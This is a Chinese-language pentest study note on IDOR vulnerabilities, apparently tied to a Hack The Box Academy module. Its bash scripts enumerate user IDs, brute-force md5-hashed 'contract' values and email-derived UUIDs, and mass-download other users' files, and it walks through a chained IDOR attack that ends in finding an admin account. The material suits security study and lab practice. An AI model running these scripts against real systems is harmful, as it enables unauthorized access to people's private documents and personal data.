# IDOR

{% hint style="info" %}
`Insecure Direct Object References (IDOR)` 漏洞是最常見的網路漏洞之一，可能會對有漏洞的網路應用程式造成嚴重影響。當 Web 應用程式公開對物件（如檔案或資料庫資源）的直接引用時，就會出現 IDOR 漏洞，最終使用者可以直接控制該引用以取得對其他類似物件的存取權限。如果由於缺乏穩固的存取控制系統而導致任何使用者可以存取任何資源，則該系統被視為易受攻擊。

\
建立可靠的存取控制系統非常具有挑戰性，這就是 IDOR 漏洞普遍存在的原因。此外，自動識別存取控制系統中的弱點的過程也相當困難，這可能導致這些漏洞在投入生產之前都無法被發現。
{% endhint %}

## <mark style="color:red;">**1. 發現點**</mark>

*   **未受保護的用戶文檔查詢**：

    ```bash
    http://example.com/documents.php?uid=1
    ```

    * 這個 URL 允許根據 `uid` 獲取用戶的文檔連結。
    * 攻擊者可以透過遍歷 `uid` 來收集所有用戶的文檔資訊。
*   **基於 `contract` 參數的下載端點**：

    ```bash
    http://example.com/download.php?contract=40f5888b67c748df7efba008e7c2f9d2
    ```

    * `contract` 參數可能是基於 `uid` 的哈希（如 `md5(uid)` 或 `UUID`）。
    * 攻擊者可以嘗試使用不同的哈希值來獲取其他用戶的文檔。
*   **API 可遍歷的用戶資訊**：

    ```bash
    GET /user/profile?id=124
    ```

    * 這個 API 允許透過 `id` 參數查詢其他用戶的個人資料。
    * 如果沒有適當的權限驗證，攻擊者可以遍歷 ID 來收集所有用戶的個資。
*   **UUID 作為下載參數**：

    ```bash
    http://example.com/download.php?uuid=550e8400-e29b-41d4-a716-446655440000
    ```

    * 這可能是一個 UUID，代表某個文件的唯一標識符。
    * 如果 UUID 可預測或可以暴力破解，攻擊者可以下載其他用戶的文件。

## <mark style="color:red;">**2. 測試Payload**</mark>

#### **(1) 遍歷 `uid` 獲取文件**

```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..100}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

**解釋**：

* 遍歷 `uid` 1 到 100，檢查是否能獲取 `.pdf` 文件連結。
* 使用 `wget` 下載每個發現的文件。

***

#### **(2) 嘗試哈希變體下載文件**

```bash
#!/bin/bash

for i in {1..100}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

**解釋**：

* 嘗試 `contract` 參數是否為 `md5(uid)`。
* 嘗試 `base64(uid)` + `md5` 來測試哈希變體。

***

#### **(3) UUID 碰撞攻擊**

如果 `contract` 或 `uuid` 是基於某個可推測的模式（如 `md5(email)`），可以暴力測試：

```bash
for email in $(cat email_list.txt); do
    uuid=$(echo -n $email | md5sum | awk '{print $1}')
    curl -sOJ "http://example.com/download.php?uuid=$uuid"
done
```

**解釋**：

* 透過 `email_list.txt` 內的郵件地址生成 `md5(email)`。
* 測試是否可作為 `uuid` 來下載文件。





## <mark style="color:red;">3. 連鎖IDOR漏洞</mark>

#### **🔗 第一步：利用 `documents.php?uid=X` 來獲取用戶數據**

攻擊者可以遍歷 `uid` 來獲取所有員工的個人資訊，例如：

```
http://example.com/documents.php?uid=1
```

返回：

```json
{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "document_link": "/documents/file_1.pdf"
}
```

✅ **我們現在知道：**

* `uid` 可遍歷，攻擊者可以獲取所有用戶的 `UUID`、`email` 和 `document_link`。

#### **🔗 第二步：利用 `contract=md5(uid)` 來下載文件**

攻擊者現在擁有了一個員工的 `uid`，我們猜測文件下載 API 可能使用 `md5(uid)` 作為 `contract`：

```
http://example.com/download.php?contract=40f5888b67c748df7efba008e7c2f9d2
```

攻擊者使用以下腳本遍歷 `contract`：

```bash
for i in {1..100}; do
    md5_hash=$(echo -n $i | md5sum | awk '{print $1}')
    curl -sOJ -X POST -d "contract=$md5_hash" http://example.com/download.php
done
```

✅ **現在我們可以批量下載所有員工的文件。**

***

#### **🔗 第三步：利用 `GET /user/profile?id=X` 獲取高權限帳戶**

攻擊者現在有了一份員工列表，他發現系統允許透過 `id` 來查詢個人資料：

```
GET /user/profile?id=124
```

回應：

```json
{
    "id": 124,
    "role": "admin",
    "full_name": "John Doe",
    "email": "admin@example.com"
}
```

✅ **我們成功找到了 `admin` 的 `id`！**

## <mark style="color:red;">4.Skills Assessment</mark>

[<mark style="color:red;">https://academy.hackthebox.com/module/134/section/1219</mark>](https://academy.hackthebox.com/module/134/section/1219)

